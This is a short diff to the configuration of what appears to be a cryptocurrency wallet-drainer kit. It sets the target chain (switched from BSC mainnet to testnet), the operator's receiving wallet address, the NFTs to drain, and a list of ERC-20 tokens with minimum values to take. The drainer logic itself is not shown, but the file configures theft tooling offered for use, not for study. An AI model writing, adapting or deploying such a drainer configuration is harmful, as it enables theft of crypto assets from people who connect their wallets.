@@ -1,6 +1,6 @@
-const workChainId = 56; // The network we are working with is the chainId list https://chainlist.org/
+const workChainId = 97; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "0xe07B30fb2653e4FC7D8a96f8952A24f63A08B191"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "0xc12363490b9e6c56ee739c832E4cd4ac5c8287C6"; // YOUR WALLET ADDRESS "TUTORIAL"
 
 
 const drainNftsInfo = {
@@ -31,6 +31,7 @@ const erc20list = {
   '0xe9e7cea3dedca5984780bafc599bd69add087d56': 0.01, // busd
   '0xB8c77482e45F1F44dE1745F52C74426C631bDD52': 0.001, // BNB
   '0x25d887ce7a35172c62febfd67a1856f20faebb00': 0.01, // PEPE
+  '0x1A26d803C2e796601794f8C5609549643832702C': 0.001 // tBNB
 }
 
 const installInNewWindow = true; // install wallet if not installed
